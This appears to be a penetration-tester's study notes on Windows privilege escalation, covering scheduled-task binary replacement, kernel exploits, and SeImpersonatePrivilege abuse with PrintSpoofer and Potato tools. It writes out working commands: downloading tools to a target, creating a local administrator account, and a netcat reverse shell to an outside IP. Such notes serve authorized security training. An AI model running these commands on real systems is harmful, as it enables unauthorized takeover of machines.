## Scheduled Tasks

Windows uses the Task Scheduler to execute various automated tasks (*Scheduled Tasks*), defined with one or more triggers.

Vital info we should obtain from a scheduled task to identify possible privesc vectors:
- As which user account (principal) does this task get executed?
	- Will abusing this task lead to privilege escalation?
- What triggers are specified for this task?
	- If the trigger condition was met in the past, the task will not run again in the future
	- If the task is set to run after the deadline of the pentest (still mention in the finding report!)
- What actions are executed when one or more of these triggers are met?
	- How we can perform the potential privilege escalation
	- Usually can replace binary or place missing DLL like in [[Leveraging Windows Services]]

Steps:
1. Connect to target machine
2. View scheduled tasks:
   `schtasks /query /fo LIST /v`
   Pay attention to info that answers the three questions above:
	   - TaskName
	   - Next Run Time
	   - Author
	   - Task To Run
	   - Run As User
3. Check if we have the permissions to write to the file to be executed by target task ("Task to Run"):
   `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`
4. Replace the executable file with malicious one (see [[Leveraging Windows Services]])
5. Wait for scheduled task to execute, then check if new user with local administrative privileges is created successfully

## Using Exploits

Three kinds:
- Application-based (see [[Locating Public Exploits]])
- Windows kernel exploits (very advanced, no need to know details)
	- Keep in mind that these exploits can easily crash a system. Download and use with caution.
- Abusing certain Windows privileges
	- *SeImpersonatePrivilege*: offers the possibility to leverage a token with another security context
		- By default, local Administrators, LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts have this privilege
	- *SeBackupPrivilege*, *SeAssignPrimaryToken*, *SeLoadDriver*, and *SeDebug*

### Kernel exploit

Enumeration:
1. Check if current user has any special privs assigned:
   `whoami /priv`
2. Enumerate version of Windows:
   `systeminfo`
3. Enumerate any security patches installed:
   `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
4. Check the Security Vulnerabilities section of [Microsoft Security Response Center](https://msrc.microsoft.com/) for any known vulnerabilities, or search on internet: https://msrc.microsoft.com/update-guide/
5. After a public exploit is located, check the official [MSRC website for the vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360) to make sure that the required patch is not applied on the target
6. Compile the public exploit (use `systeminfo` to check system type for compilation, see also [[Leveraging Windows Services]]) and transfer to target. Run exploit.

### SeImpersonatePrivilege 

Named pipes:
- a method for Inter-Process Communication in Windows
- A named pipe server can create a named pipe to which a named pipe client can connect via the specified name
- server and client don't need to reside on same system
- Once a client connects to a named pipe, the server can leverage SeImpersonatePrivilege to impersonate this client after capturing the authentication from the connection process. 
- To abuse this, we need to find a privileged process and coerce it into connecting to a controlled named pipe

#### Example: PrintSpoofer

Tool: [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- coerces NT AUTHORITY\SYSTEM into connecting to a controlled named pipe
- Prerequisites:
	- we have code execution as a user with the privilege SeImpersonatePrivilege to execute commands or obtain an interactive shell as NT AUTHORITY\\SYSTEM

Steps:
1. Connect to bind shell in target machine
2. Check that we have SeImpersonatePrivilege:
   `whoami /priv`
3. Download 64-bit version of PrintSpoofer to Kali and serve it on a Python web server:
   `wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`
4. Transfer the PrintSpoofer binary to the target machine:
   (PS) `iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe`
5. `.\PrintSpoofer64.exe -i -c powershell.exe`
	- `-c`: specify command to execute as the privileged user
	- `-i`: interact with the process in the current command prompt

Alternative tools: variants of the Potato family

> If the created shell dies immediately, create a reverse shell to Kali! (e.g. using nc.exe)

#### Example: [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
implements a variation of the potato privilege escalations to coerce NT AUTHORITY\SYSTEM into connecting to a controlled named pipe

When to use:
- have code execution as a user with the privilege *SeImpersonatePrivilege* to execute commands or obtain an interactive shell as NT AUTHORITY\SYSTEM

Steps:
1. Connect to bind shell on target machine
2. Check the privileges of current user:
   `whoami /priv`
	- Check that we have *SeImpersonatePrivilege*
3. Download the SigmaPotato tool (version depends on the target system) on Kali and serve it on an http server on Kali:
   `wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
   `python3 -m http.server 80`
4. Download the tool on target:
   `powershell`
   `iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe`
5. Use SigmaPotato to execute command in the context of NT AUTHORITY\SYSTEM: (e.g. create a new local Admin account)
   `.\SigmaPotato "net user dave4 lab /add"` 
   `net user`
   `.\SigmaPotato "net localgroup Administrators dave4 /add"`
   `net localgroup Administrators`

Useful reference: [Different kinds of potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

### Potatoes guide

- `PrintSpoofer64.exe`
	- Windows 10 and Server 2016/2019
	- `.\PrintSpoofer64.exe -i -c powershell.exe` (or do command for reverse shell if powershell dies immediately)
- `God-Potato-NET35.exe`
	- Windows Server 2012-2022, Windows 8-11
	- `God-Potato-NET35.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"`
- `God-Potato-NET4.exe`
	- Windows Server 2012-2022, Windows 8-11
	- `.\God-Potato-NET4.exe -cmd "powershell -e {REVSHELL}"`
- `RoguePotato.exe`
	- Windows Server 2019
- `JuicyPotatoNG.exe`

